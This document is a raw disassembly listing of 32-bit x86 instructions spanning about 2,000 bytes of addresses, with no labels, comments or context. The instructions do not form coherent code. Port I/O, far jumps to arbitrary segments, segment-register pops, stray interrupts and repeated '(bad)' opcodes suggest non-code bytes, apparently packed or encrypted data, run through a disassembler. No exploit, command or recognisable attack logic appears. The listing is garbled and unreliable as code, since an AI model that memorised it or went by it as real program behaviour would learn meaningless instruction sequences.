  423d42:	mov    edx,0xb857ffb2
  423d47:	mov    al,0x8e
  423d49:	sbb    eax,0x1b6ba
  423d4e:	std    
  423d4f:	add    DWORD PTR [eax],eax
  423d51:	add    BYTE PTR [eax+0x35],ch
  423d54:	cmp    al,BYTE PTR [ebp-0x2869325d]
  423d5a:	cmp    edx,DWORD PTR [eax]
  423d5c:	mov    ebx,0xc2a551fe
  423d61:	cwde   
  423d62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d63:	pop    es
  423d64:	xchg   ecx,eax
  423d65:	pop    ss
  423d66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d67:	or     DWORD PTR [edi],edi
  423d69:	rcl    DWORD PTR [esi],1
  423d6b:	std    
  423d6c:	add    BYTE PTR [ecx-0x63],ah
  423d6f:	out    dx,al
  423d70:	mov    ebp,0xe644561a
  423d75:	push   ss
  423d76:	gs inc ebp
  423d78:	ins    BYTE PTR es:[edi],dx
  423d79:	jbe    0x423d70
  423d7b:	inc    edx
  423d7c:	in     al,dx
  423d7d:	mov    eax,ds:0xb15b286e
  423d82:	scas   al,BYTE PTR es:[edi]
  423d83:	xchg   edx,eax
  423d84:	pop    edi
  423d85:	xor    al,0x4c
  423d87:	pop    ebp
  423d88:	push   0xffffffac
  423d8a:	push   es
  423d8b:	cmp    al,dh
  423d8d:	push   es
  423d8e:	add    eax,0xf6764887
  423d93:	mul    DWORD PTR [ebx-0x80]
  423d96:	lock xchg DWORD PTR [ebx],ebx
  423d99:	or     BYTE PTR [ebp+ecx*4+0x58b89939],0x3f
  423da1:	jbe    0x423d94
  423da3:	ins    BYTE PTR es:[edi],dx
  423da4:	shl    BYTE PTR [ecx-0x55],0x7
  423da8:	and    dh,cl
  423daa:	mov    edx,0xd9b083dc
  423daf:	call   0x11bc:0x831ddc48
  423db6:	add    DWORD PTR [edi-0x68062b3e],0xfa474530
  423dc0:	sbb    BYTE PTR [ecx-0x49],dh
  423dc3:	mov    ch,0xcb
  423dc5:	fsub   st,st(5)
  423dc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423dc8:	int    0x7
  423dca:	jmp    0x423df5
  423dcc:	ficomp WORD PTR [ebx-0x29a5d563]
  423dd2:	push   0xfffffffd
  423dd4:	rcr    BYTE PTR [ecx],cl
  423dd6:	jmp    0x423e3b
  423dd8:	in     eax,0xd7
  423dda:	or     BYTE PTR [eax-0x6ebab55d],0xd7
  423de1:	inc    edi
  423de2:	out    dx,al
  423de3:	into   
  423de4:	mov    ds:0x73152584,eax
  423de9:	std    
  423dea:	dec    edi
  423deb:	mov    ah,BYTE PTR [edx]
  423ded:	mov    al,0xf7
  423def:	xchg   ebp,eax
  423df0:	add    ecx,esi
  423df2:	mov    edx,esi
  423df4:	and    DWORD PTR [ecx],ecx
  423df6:	sub    eax,0xeb86226
  423dfb:	xor    edx,DWORD PTR [ebp-0x44]
  423dfe:	xlat   BYTE PTR ds:[ebx]
  423dff:	shl    BYTE PTR [ebx+eax*8-0x632a5100],0xd1
  423e07:	in     eax,0x4
  423e09:	xchg   ebx,eax
  423e0a:	push   edi
  423e0b:	test   BYTE PTR [edi],ch
  423e0d:	dec    esi
  423e0e:	rol    eax,0xb7
  423e11:	aas    
  423e12:	push   es
  423e13:	ret    
  423e14:	fwait
  423e15:	sbb    DWORD PTR cs:[esi-0x48f24885],ecx
  423e1c:	jmp    0x423ddd
  423e1e:	(bad)  
  423e20:	js     0xef5ae360
  423e26:	lock jmp 0x423e33
  423e29:	push   ebp
  423e2a:	int    0x51
  423e2c:	fistp  QWORD PTR [esi]
  423e2e:	sub    esp,eax
  423e30:	jnp    0x423e9a
  423e32:	jbe    0x423e99
  423e34:	pop    esp
  423e35:	ins    DWORD PTR es:[edi],dx
  423e36:	pop    ecx
  423e37:	sbb    DWORD PTR [edx+0x2115a1ad],esp
  423e3d:	inc    ebx
  423e3e:	mov    al,0xba
  423e40:	mov    edx,0x1160c2c4
  423e45:	xchg   edi,eax
  423e46:	add    al,0xc0
  423e48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e49:	(bad)  
  423e4a:	aam    0xd
  423e4c:	int    0xcb
  423e4e:	cmp    BYTE PTR ds:0x786c9905,dh
  423e54:	push   ss
  423e55:	(bad)  
  423e56:	sub    eax,0x68090747
  423e5b:	stos   DWORD PTR es:[edi],eax
  423e5c:	sbb    ah,BYTE PTR [esi+0xafc586c]
  423e62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e63:	nop
  423e64:	dec    esp
  423e65:	and    dl,bh
  423e67:	sub    ah,BYTE PTR [ecx+esi*4-0x43]
  423e6b:	retf   0x6b20
  423e6e:	fst    QWORD PTR [edx+0x4b]
  423e71:	adc    DWORD PTR [edx],0xf82ce657
  423e77:	sub    al,0x79
  423e79:	aam    0x1
  423e7b:	inc    ecx
  423e7c:	jbe    0x423ed5
  423e7e:	mov    BYTE PTR [ebx],ah
  423e80:	shl    dl,1
  423e82:	ja     0x423e15
  423e84:	pop    esp
  423e85:	dec    esi
  423e86:	enter  0xc739,0x96
  423e8a:	mov    ?,WORD PTR [esi+esi*4-0x36f370e]
  423e91:	test   DWORD PTR [esi],esp
  423e93:	or     esp,DWORD PTR [edi+0x65]
  423e96:	icebp  
  423e97:	dec    ebp
  423e98:	fcmovne st,st(2)
  423e9a:	fcmovu st,st(5)
  423e9c:	cmp    al,0xdd
  423e9e:	mov    al,ds:0x28864411
  423ea3:	adc    ch,BYTE PTR ds:0xb1c46c7f
  423ea9:	xchg   ebx,eax
  423eaa:	imul   edx,esp,0xe2ad070e
  423eb0:	mov    bh,0x99
  423eb2:	test   eax,0xddc9ab5c
  423eb7:	jmp    0xa9e362a8
  423ebc:	or     ebp,DWORD PTR [eax-0x6c]
  423ebf:	test   eax,0x9ec7fbfb
  423ec4:	jg     0x423eed
  423ec6:	push   0x31b4c0c5
  423ecb:	repz rol BYTE PTR [edi+0x58],cl
  423ecf:	and    eax,0x17483cd1
  423ed4:	and    al,0xa
  423ed6:	ins    BYTE PTR es:[edi],dx
  423ed7:	add    eax,0xed9723a9
  423edc:	ret    0x400a
  423edf:	lock outs dx,DWORD PTR ds:[esi]
  423ee1:	jnp    0x423ec7
  423ee3:	leave  
  423ee4:	shr    bh,cl
  423ee6:	mov    ch,0x5e
  423ee8:	sahf   
  423ee9:	ds mov bl,0x8b
  423eec:	pop    ebp
  423eed:	mov    ds:0x79912032,eax
  423ef2:	inc    edi
  423ef3:	or     al,0x8f
  423ef5:	push   ds
  423ef6:	xchg   bh,cl
  423ef8:	aas    
  423ef9:	or     ch,BYTE PTR [ebx]
  423efb:	xor    BYTE PTR [edi],cl
  423efd:	int3   
  423efe:	pop    ss
  423eff:	fdiv   DWORD PTR [ecx-0x2c]
  423f02:	fld    DWORD PTR [edx+0xb]
  423f05:	mov    al,ds:0xf30634a7
  423f0a:	inc    esp
  423f0b:	mov    eax,es
  423f0d:	aas    
  423f0e:	mov    ebp,0xb165360c
  423f13:	jo     0x423e95
  423f15:	push   ss
  423f16:	aad    0x4
  423f18:	jle    0x423ec7
  423f1a:	mov    esi,0x2a3d5f1f
  423f1f:	pop    eax
  423f20:	xor    eax,0xbc2ab956
  423f25:	or     al,0x39
  423f27:	mov    ds:0xe5b303b5,eax
  423f2c:	xor    eax,DWORD PTR [ecx+edi*1+0x4d]
  423f30:	push   ds
  423f31:	mov    bl,0x28
  423f33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423f34:	ror    dl,cl
  423f36:	mov    ds:0xe0ab229,al
  423f3b:	icebp  
  423f3c:	push   esi
  423f3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423f3e:	fadd   DWORD PTR [edi+eiz*2+0x4fbbb0b8]
  423f45:	dec    ebx
  423f46:	stc    
  423f47:	xchg   esi,eax
  423f48:	xor    DWORD PTR [eax-0x3a6c752b],esi
  423f4e:	into   
	...
  423f57:	add    BYTE PTR [eax],al
  423f59:	add    BYTE PTR [ecx],bh
  423f5b:	sbb    al,0x89
  423f5d:	out    0xad,eax
  423f5f:	idiv   DWORD PTR [edi-0x22]
  423f62:	test   eax,0x3ae902b9
  423f67:	sub    al,0x3e
  423f69:	call   0x43f825
  423f6e:	std    
  423f6f:	add    DWORD PTR [eax],eax
  423f71:	add    BYTE PTR [ebx-0x31],cl
  423f74:	xor    ebp,esi
  423f76:	std    
  423f77:	push   esp
  423f78:	iret   
  423f79:	pop    ds
  423f7a:	mov    ebp,0x2ced7ebe
  423f7f:	rcl    DWORD PTR [edi+0xa],1
  423f82:	sbb    eax,0xffffff98
  423f85:	sar    BYTE PTR [esi],cl
  423f87:	out    0x7d,eax
  423f89:	fwait
  423f8a:	icebp  
  423f8b:	cmp    bl,BYTE PTR [eax-0x67e7a774]
  423f91:	cmp    cl,bh
  423f93:	jmp    0xff59:0x1e46870c
  423f9a:	rcr    DWORD PTR [ebp+0x7ddff372],0xd0
  423fa1:	out    0x5b,eax
  423fa3:	(bad)  
  423fa4:	sub    ebp,DWORD PTR [edx]
  423fa6:	inc    esi
  423fa7:	out    dx,al
  423fa8:	cmp    eax,0xac617a
  423fad:	dec    esi
  423fae:	mov    edx,0x799c6585
  423fb3:	inc    esp
  423fb4:	call   0xa23e82ae
  423fb9:	mov    BYTE PTR [edi-0x53],dh
  423fbc:	repz sub DWORD PTR [ebx-0x7d],edi
  423fc0:	add    BYTE PTR [ebx+0x72f5805e],dl
  423fc6:	xor    BYTE PTR [esp+eax*4+0x451d56fc],0x75
  423fce:	pop    esp
  423fcf:	inc    eax
  423fd0:	scas   al,BYTE PTR es:[edi]
  423fd1:	nop
  423fd2:	or     BYTE PTR [eax+0x1f69b5e9],dl
  423fd8:	adc    BYTE PTR [eax+0x50eb556],al
  423fde:	fisttp DWORD PTR [ebx]
  423fe0:	or     esi,DWORD PTR [ecx+0x4]
  423fe3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423fe4:	scas   al,BYTE PTR es:[edi]
  423fe5:	mov    DWORD PTR [ecx-0x13678fbb],edx
  423feb:	out    dx,eax
  423fec:	push   0xde409ccf
  423ff1:	test   BYTE PTR [ecx+0x77095892],dl
  423ff7:	mov    WORD PTR ds:0x30c23200,?
  423ffd:	fwait
  423ffe:	sub    DWORD PTR [esi+edx*8],0xd02a145d
  424005:	data16 sbb cl,BYTE PTR [ebx-0x1c776218]
  42400c:	lods   eax,DWORD PTR ds:[esi]
  42400d:	mov    ss,ebx
  42400f:	mov    esi,0xb3de0a6e
  424014:	pop    eax
  424015:	(bad)  
  424016:	xor    DWORD PTR [ecx+edi*8],edi
  424019:	lods   al,BYTE PTR ds:[esi]
  42401a:	mov    ch,ch
  42401c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42401d:	and    BYTE PTR [esi+0x39addb0f],cl
  424023:	add    bh,ch
  424025:	xor    eax,0x7470a76a
  42402a:	mov    edx,0x548e2fc2
  42402f:	adc    edi,ecx
  424031:	out    dx,eax
  424032:	sbb    ebp,DWORD PTR [ecx-0x3f]
  424035:	push   ecx
  424036:	js     0x42409d
  424038:	xchg   edi,eax
  424039:	leave  
  42403a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42403b:	pop    eax
  42403c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42403d:	les    edi,FWORD PTR [ebp*2-0x711d4222]
  424044:	ins    DWORD PTR es:[edi],dx
  424045:	push   0xac402776
  42404a:	adc    DWORD PTR [edi+0x2a75a3fd],ecx
  424050:	add    BYTE PTR [ebp+0x6e],cl
  424053:	fisubr DWORD PTR [edx+0x5a]
  424056:	cdq    
  424057:	in     al,dx
  424058:	add    eax,0x5fba0fb1
  42405d:	pop    ds
  42405e:	lea    ebx,[ebx+0x7b]
  424061:	es or  eax,0xaa9b838e
  424067:	dec    edx
  424068:	push   esp
  424069:	int3   
  42406a:	and    BYTE PTR [edi-0x52],dl
  42406d:	mov    ecx,0x28c28528
  424072:	push   esp
  424073:	rcr    DWORD PTR [ebx-0x7f3d81a7],1
  424079:	or     DWORD PTR [ebx-0x14],0x7a
  42407d:	gs or  al,0x3b
  424080:	test   al,0x9
  424082:	outs   dx,BYTE PTR ds:[esi]
  424083:	pop    edx
  424084:	test   DWORD PTR [edi+0x2d],0x92f445c8
  42408b:	outs   dx,DWORD PTR ds:[esi]
  42408c:	outs   dx,DWORD PTR ds:[esi]
  42408d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42408e:	add    DWORD PTR [ecx+0x37],ebx
  424091:	mov    edx,0x8bc245e6
  424096:	nop
  424097:	inc    ecx
  424098:	jne    0x42409e
  42409a:	leave  
  42409b:	push   edi
  42409c:	mov    gs,edx
  42409e:	xlat   BYTE PTR ds:[ebx]
  42409f:	in     al,0x13
  4240a1:	call   0x8635dfdc
  4240a6:	add    al,0xe5
  4240a8:	mov    ebp,0x8b82130d
  4240ad:	or     edi,DWORD PTR [edx-0x66]
  4240b0:	cmp    DWORD PTR [esi+0x30],0x73119a1b
  4240b7:	inc    esp
  4240b8:	scas   al,BYTE PTR es:[edi]
  4240b9:	iret   
  4240ba:	jl     0x424048
  4240bc:	das    
  4240bd:	push   ds
  4240be:	inc    edi
  4240bf:	cli    
  4240c0:	pop    ss
  4240c1:	or     eax,0xe3ef0c41
  4240c6:	xchg   cl,dh
  4240c8:	push   ss
  4240c9:	mov    ds:0xef866b00,al
  4240ce:	(bad)  
  4240cf:	mov    ecx,0x1dee2ed3
  4240d4:	xchg   ebp,eax
  4240d5:	sub    BYTE PTR [esi],al
  4240d7:	test   eax,0xbea74b78
  4240dc:	sub    BYTE PTR [ebp+0x6],al
  4240df:	jbe    0x42411b
  4240e1:	inc    esp
  4240e2:	hlt    
  4240e3:	daa    
  4240e4:	retf   0xc3
  4240e7:	xor    eax,0xa93c64bb
  4240ec:	gs es adc bh,dl
  4240f0:	mov    eax,0x33adc2c
  4240f5:	js     0x42407f
  4240f7:	sahf   
  4240f8:	xor    bl,ch
  4240fa:	cmp    BYTE PTR [esi],ch
  4240fc:	adc    bh,0x79
  4240ff:	ins    BYTE PTR es:[edi],dx
  424100:	xor    ch,BYTE PTR [ebx+0x713fe9e3]
  424106:	(bad)  
  424107:	fisub  DWORD PTR [ebx+0x1742c69c]
  42410d:	add    al,0x20
  42410f:	shl    ah,0x2b
  424112:	xor    eax,edi
  424114:	or     ecx,edx
  424116:	mov    eax,0xf184a36d
  42411b:	dec    ebp
  42411c:	mov    ds:0xd44b7a0a,eax
  424121:	out    dx,al
  424122:	ins    BYTE PTR es:[edi],dx
  424123:	(bad)  
  424124:	add    esi,DWORD PTR [eax-0x283b6fcf]
  42412a:	into   
  42412b:	aas    
  42412c:	xchg   esi,eax
  42412d:	cmp    BYTE PTR [eax],dh
  42412f:	icebp  
  424130:	stos   DWORD PTR es:[edi],eax
  424131:	push   ds
  424132:	std    
  424133:	mov    dl,0x91
  424135:	pop    esi
  424136:	das    
  424137:	push   cs
  424138:	push   0xe4152efe
  42413d:	mov    dl,0x8a
  424140:	daa    
  424141:	xor    ah,ah
  424143:	xor    ecx,DWORD PTR [edx+ebp*4-0x4e]
  424147:	adc    al,0x61
  424149:	inc    ebp
  42414a:	lahf   
  42414b:	push   es
  42414c:	mov    eax,ds:0x38acb434
  424151:	mov    al,ds:0x13694bb0
  424156:	or     edi,DWORD PTR [edi+0x3a]
  424159:	mov    al,0x67
  42415b:	xor    ecx,DWORD PTR [eax+ecx*2+0x0]
  42415f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424160:	jo     0x424159
  424162:	cld    
  424163:	ss repnz ds popf 
  424167:	das    
  424168:	fild   WORD PTR [ecx+0x3c05da64]
  42416e:	pop    esp
	...
  424177:	add    BYTE PTR [eax],al
  424179:	add    BYTE PTR [ebp-0x4c],ah
  42417c:	sbb    dh,bl
  42417e:	fsin   
  424180:	out    0xbf,eax
  424182:	fs dec edi
  424184:	popf   
  424185:	outs   dx,BYTE PTR ds:[esi]
  424186:	fwait
  424187:	sub    DWORD PTR [edi],ebx
  424189:	xor    DWORD PTR [edx+edi*4+0x1fd0001],0x0
  424191:	add    BYTE PTR [eax],ch
  424193:	fs add eax,0x5206a887
  424199:	mov    DWORD PTR [esi],ebx
  42419b:	xchg   edi,eax
  42419c:	add    ebx,edi
  42419e:	push   esi
  42419f:	jle    0x4241cf
  4241a1:	imul   ebp,DWORD PTR [esi],0xbb759f8d
  4241a7:	mov    ch,0x5e
  4241a9:	fwait
  4241aa:	leave  
  4241ab:	adc    DWORD PTR fs:[ebp+edx*2+0x1dd3a92a],eax
  4241b3:	vmaxps ymm4,ymm1,ymm2
  4241b7:	sub    eax,0x4917bc51
  4241bc:	aaa    
  4241bd:	loop   0x4241e8
  4241bf:	push   0xf92488d6
  4241c4:	bound  ebp,QWORD PTR [edx-0x34]
  4241c7:	inc    esp
  4241c8:	cdq    
  4241c9:	pop    ss
  4241ca:	xchg   esp,eax
  4241cb:	adc    ah,BYTE PTR [esi-0x7200b95f]
  4241d1:	rol    BYTE PTR [ebp-0x66d943a2],0xd4
  4241d8:	lock addr16 clc 
  4241db:	stos   BYTE PTR es:[edi],al
  4241dc:	sub    dl,BYTE PTR [esp+eiz*4]
  4241df:	sbb    BYTE PTR [ecx+0xe],0x7c
  4241e3:	and    ch,BYTE PTR ds:0x70741869
  4241e9:	inc    eax
  4241ea:	loopne 0x424234
  4241ec:	mov    BYTE PTR [esi-0x196c82c9],al
  4241f2:	cdq    
  4241f3:	dec    edx
  4241f4:	arpl   WORD PTR [ecx-0x4a],bp
  4241f7:	out    0x3,al
  4241f9:	sub    al,0xe7
  4241fb:	stos   BYTE PTR es:[edi],al
  4241fc:	adc    ecx,ecx
  4241fe:	inc    ebp
  4241ff:	mul    DWORD PTR [edi-0x10]
  424202:	aas    
  424203:	shr    DWORD PTR [esi],0x8a
  424206:	cmp    al,0x97
  424208:	lahf   
  424209:	mov    bl,BYTE PTR [eax-0x46ce3376]
  42420f:	push   ds
  424210:	(bad)  
  424211:	adc    bh,BYTE PTR [eax]
  424213:	ss xchg ebx,eax
  424215:	jae    0x424240
  424217:	into   
  424218:	retf   0x41cd
  42421b:	lods   eax,DWORD PTR ds:[esi]
  42421c:	push   DWORD PTR [edx-0x2b]
  42421f:	xchg   esp,eax
  424220:	lods   eax,DWORD PTR ds:[esi]
  424221:	mov    esi,0x51ab371d
  424226:	(bad)  
  424227:	stos   DWORD PTR es:[edi],eax
  424228:	cmp    BYTE PTR [ebp+0x5233db48],al
  42422e:	in     al,0xc5
  424230:	cmp    al,0xa8
  424232:	mov    esi,0x5ef0f4e5
  424237:	test   eax,0x2096876a
  42423c:	pop    ebp
  42423d:	sub    BYTE PTR [bx+si],0xb7
  424241:	stos   BYTE PTR es:[edi],al
  424242:	push   ebp
  424243:	in     eax,0x67
  424245:	rol    BYTE PTR [edx+0x3c],0x22
  424249:	ds mov esi,edx
  42424c:	ss jbe 0x424230
  42424f:	add    eax,0x25c5f599
  424254:	(bad)  
  424256:	arpl   WORD PTR [ebp+0x6c],dx
  424259:	scas   eax,DWORD PTR es:[edi]
  42425a:	xchg   ebp,eax
  42425b:	inc    esi
  42425c:	loope  0x424205
  42425e:	ins    DWORD PTR es:[edi],dx
  42425f:	int    0xf6
  424261:	in     eax,0x18
  424263:	test   ebx,edi
  424265:	and    dh,bh
  424267:	jle    0x424280
  424269:	ja     0x424276
  42426b:	and    al,0x43
  42426d:	ret    0x67f1
  424270:	repnz add ebp,ebx
  424273:	and    bh,cl
  424275:	int3   
  424276:	xchg   ecx,eax
  424277:	out    0xee,eax
  424279:	dec    ecx
  42427a:	mov    edi,0x542306e9
  42427f:	jp     0x424206
  424281:	pop    ss
  424282:	push   eax
  424283:	jmp    0x424303
  424285:	test   al,0x84
  424287:	fdiv   DWORD PTR [edi-0x9]
  42428a:	adc    edx,DWORD PTR [edi]
  42428c:	cld    
  42428d:	pop    es
  42428e:	leave  
  42428f:	das    
  424290:	jo     0x4242dc
  424292:	xor    al,BYTE PTR [esi+0x35]
  424295:	cwde   
  424296:	jo     0x424305
  424298:	pop    ss
  424299:	cmp    esi,DWORD PTR [edi]
  42429b:	mov    eax,DWORD PTR [eax-0x37a4d359]
  4242a1:	nop
  4242a2:	and    al,0x3d
  4242a4:	test   DWORD PTR [eax],0xe325f12c
  4242aa:	data16 add BYTE PTR [edx],cl
  4242ad:	mov    bh,0xf
  4242af:	pusha  
  4242b0:	sub    BYTE PTR [edi+0x69b5c1ce],bl
  4242b6:	mov    cl,0xab
  4242b8:	mov    ds:0xae605b57,al
  4242bd:	imul   eax,DWORD PTR [ebx-0xcf6eb61],0x51d9abc2
  4242c7:	sbb    eax,0xd62765c4
  4242cc:	icebp  
  4242cd:	xor    al,0x9a
  4242cf:	xor    al,0x16
  4242d1:	lods   eax,DWORD PTR ds:[esi]
  4242d2:	jecxz  0x424257
  4242d4:	and    BYTE PTR [edi+0x3f],dl
  4242d7:	or     al,0xf2
  4242d9:	sbb    DWORD PTR [eax+ebp*8],edx
  4242dc:	dec    edx
  4242dd:	cmp    DWORD PTR [ecx-0x7a6b6c1e],edx
  4242e3:	mov    edi,0x55abe5a0
  4242e8:	xchg   esi,eax
  4242e9:	dec    ebx
  4242ea:	dec    ebp
  4242eb:	cmp    bl,bl
  4242ed:	mov    dl,0x6a
  4242ef:	xchg   ebx,eax
  4242f0:	cmp    eax,0xd378e570
  4242f5:	inc    edi
  4242f6:	xlat   BYTE PTR ds:[ebx]
  4242f7:	mov    ebx,0xd596ebb7
  4242fc:	fist   WORD PTR [ecx]
  4242fe:	adc    cl,BYTE PTR [edx-0xe]
  424301:	jne    0x424366
  424303:	imul   esi,DWORD PTR [ecx],0xeddb5ad8
  424309:	pop    ss
  42430a:	in     al,0xc7
  42430c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42430d:	(bad)  
  42430e:	and    BYTE PTR [ebp-0x72],dh
  424311:	ror    BYTE PTR [eax-0x24f78ed3],1
  424317:	jp     0x424365
  424319:	ja     0x42436f
  42431b:	jp     0x4242cd
  42431d:	rcr    DWORD PTR [eax+0x187864cd],cl
  424323:	ffree  st(5)
  424325:	je     0x42431c
  424327:	xor    ch,BYTE PTR [edx+eax*1+0x9]
  42432b:	mov    ecx,0xe124a7fd
  424330:	xor    eax,0x80c27557
  424335:	stos   DWORD PTR es:[edi],eax
  424336:	or     DWORD PTR [esi-0x3f7eb50e],0xf4de49b9
  424340:	pop    esp
  424341:	push   ebp
  424342:	mov    dl,0xaf
  424344:	xor    DWORD PTR ds:0x1e9a7b82,ecx
  42434a:	xor    al,0x21
  42434c:	sbb    al,0xdd
  42434e:	cmp    eax,0xddb6e6ff
  424353:	into   
  424354:	int    0x1c
  424356:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424357:	jecxz  0x42437a
  424359:	sahf   
  42435a:	loopne 0x42432c
  42435c:	lods   al,BYTE PTR ds:[esi]
  42435d:	mov    WORD PTR [ebx+0x22],gs
  424360:	or     al,0xad
  424362:	jb     0x4242f0
  424364:	call   0x5b9b:0xb4fdd945
  42436b:	ins    DWORD PTR es:[edi],dx
  42436c:	add    al,0x74
  42436e:	jo     0x4243c8
  424370:	cmp    edx,DWORD PTR [ebx*1-0x2b69728c]
  424377:	adc    BYTE PTR [edx+0x38],cl
  42437a:	jmp    0x1977:0x7f8f1099
  424381:	add    DWORD PTR [eax-0x2c],0x8b3b37d9
  424388:	aam    0x88
  42438a:	out    dx,al
  42438b:	push   ebx
  42438c:	mov    ebp,0x9a40
	...
  424399:	add    BYTE PTR [edx],dl
  42439b:	fsub   DWORD PTR [ebx+0x72]
  42439e:	jmp    0x42439b
  4243a0:	adc    edi,eax
  4243a2:	jl     0x424328
  4243a4:	dec    edi
  4243a5:	dec    esp
  4243a6:	test   DWORD PTR [eax-0x434e03ee],0x1fd0001
  4243b0:	add    BYTE PTR [eax],al
  4243b2:	fidiv  WORD PTR [ebp+0x9]
  4243b5:	mov    ds:0xaf6d82b2,al
  4243ba:	leave  
  4243bb:	xor    eax,0xa566b820
  4243c0:	popf   
  4243c1:	mov    dh,0x71
  4243c3:	leave  
  4243c4:	xchg   edx,eax
  4243c5:	dec    edi
  4243c6:	sbb    eax,0x5f5f7a08
  4243cb:	fwait
  4243cc:	sub    edx,DWORD PTR [ecx]
  4243ce:	in     al,0x37
  4243d0:	push   es
  4243d1:	les    eax,FWORD PTR [esi-0x46]
  4243d4:	enter  0x9aed,0xc9
  4243d8:	rol    BYTE PTR [eax],cl
  4243da:	ins    DWORD PTR es:[edi],dx
  4243db:	sub    DWORD PTR [edx-0x14],ebp
  4243de:	out    0xaa,eax
  4243e0:	imul   edx,DWORD PTR [esi+0x534841df],0xa0db8f58
  4243ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4243eb:	jns    0x4243b2
  4243ed:	push   edx
  4243ee:	or     ebp,DWORD PTR [eax]
  4243f0:	sub    eax,0xb04550af
  4243f5:	sbb    esp,DWORD PTR [edi+0x1c29b8a9]
  4243fb:	xchg   ebx,eax
  4243fc:	push   esp
  4243fd:	lods   al,BYTE PTR ds:[esi]
  4243fe:	ss mov eax,edx
  424401:	std    
  424402:	ja     0xc3f90c60
  424408:	test   al,0x3c
  42440a:	loope  0x4243b4
  42440c:	loope  0x424403
  42440e:	loop   0x42442b
  424410:	and    ebx,edx
  424412:	fcom   DWORD PTR [eax+eax*8]
  424415:	push   ebx
  424416:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424417:	or     BYTE PTR [ecx+esi*2+0x32],bh
  42441b:	sahf   
  42441c:	add    al,BYTE PTR [esi-0x7a]
  42441f:	xor    al,0xb2
  424421:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424422:	xchg   esp,eax
  424423:	push   ebx
  424424:	daa    
  424425:	out    dx,eax
  424426:	adc    edi,DWORD PTR [ebx]
  424428:	ror    DWORD PTR [edi-0x34f7a315],1
  42442e:	xor    DWORD PTR [esi+0x38],ebp
  424431:	cld    
  424432:	mov    dl,0x64
  424434:	push   ss
  424435:	fst    DWORD PTR [eax+0x7]
  424438:	sbb    edx,DWORD PTR [edx-0x15]
  42443b:	push   ecx
  42443c:	pmulhuw mm2,mm6
  42443f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424440:	(bad)  [ebp+eiz*4-0x3f]
  424444:	xchg   esp,eax
  424445:	mov    edi,0x2e3f7cf5
  42444a:	cmp    DWORD PTR [ecx+0x6f],ecx
  42444d:	dec    eax
  42444e:	xchg   BYTE PTR [esi],bl
  424450:	sub    eax,0xf16f5b87
  424455:	push   edi
  424456:	call   0x3adba1b0
  42445b:	mov    ds:0x7a6c78b5,al
  424460:	mov    dh,0x98
  424462:	ins    BYTE PTR es:[edi],dx
  424463:	femms  
  424465:	jl     0x4243eb
  424467:	dec    ecx
  424468:	xchg   edi,eax
  424469:	rcr    bl,0x3a
  42446c:	mov    dl,0xf6
  42446e:	sub    al,0x1d
  424470:	mov    al,ds:0x985c93d4
  424475:	bound  esp,QWORD PTR [ebp+0x374691b3]
  42447b:	or     DWORD PTR [esi+eax*1-0x35b95d38],esp
  424482:	lock mov eax,ds:0x14809bb
  424488:	mov    dh,0xa5
  42448a:	xchg   ebp,eax
  42448b:	push   cs
  42448c:	mov    edi,0xa0fed4a9
  424491:	leave  
  424492:	jmp    0x42444c
  424494:	jae    0x424438
  424496:	xchg   esp,eax
  424497:	loop   0x4244ef
  424499:	div    BYTE PTR ds:0xeec83d56
  42449f:	sbb    al,0x6
  4244a1:	adc    ebp,DWORD PTR [esi+eiz*1-0x7b13e090]
  4244a8:	scas   al,BYTE PTR es:[edi]
  4244a9:	or     eax,0x43fe58a0
  4244ae:	pop    ebx
  4244af:	or     eax,0xdd9a616e
  4244b4:	sbb    BYTE PTR [edx+0x5],dh
  4244b7:	aaa    
  4244b8:	sbb    ecx,DWORD PTR [ebp+0x30]
  4244bb:	test   DWORD PTR [ecx],esp
  4244bd:	xor    edi,ecx
  4244bf:	add    ebp,DWORD PTR [eax+0x3192acdd]
  4244c5:	not    eax
  4244c7:	stc    
  4244c8:	rcl    BYTE PTR [esi],0x97
  4244cb:	mov    esi,0x390e2a96
  4244d0:	int    0xd2
  4244d2:	sub    al,bh
  4244d4:	sbb    bl,BYTE PTR [ebx]
  4244d6:	inc    edi
  4244d7:	pop    esp
  4244d8:	aaa    
  4244d9:	xchg   ebp,eax
  4244da:	test   DWORD PTR [esi],esi
  4244dc:	and    ebp,DWORD PTR [edx]
  4244de:	(bad)  
  4244e0:	mul    DWORD PTR [edi-0x63]
  4244e3:	outs   dx,DWORD PTR ds:[esi]
  4244e4:	jp     0x424487
  4244e6:	xchg   ecx,eax
  4244e7:	dec    ecx
  4244e8:	inc    esi
  4244e9:	mov    esi,0xcfc42b89
  4244ee:	fcmovu st,st(7)
  4244f0:	xor    DWORD PTR [esp+eax*4+0x5e],ecx
  4244f4:	mov    dl,BYTE PTR [eax]
  4244f6:	cmp    BYTE PTR [ebp+0x39c976aa],bh
  4244fc:	std    
  4244fd:	push   0x7a1b217e
  424502:	int    0x8
  424504:	push   ecx
  424505:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424506:	push   esp
  424507:	pop    ds
  424508:	or     eax,0xf7d9eccd
  42450d:	mov    edi,0xa2f61a63
  424512:	add    DWORD PTR [edx],esp
  424514:	sbb    al,0x82
  424516:	xchg   BYTE PTR [esi],dl
  424518:	test   al,0x2e
  42451a:	sbb    eax,0x74f516a0
  42451f:	sbb    eax,0xc8172f87
  424524:	hlt    
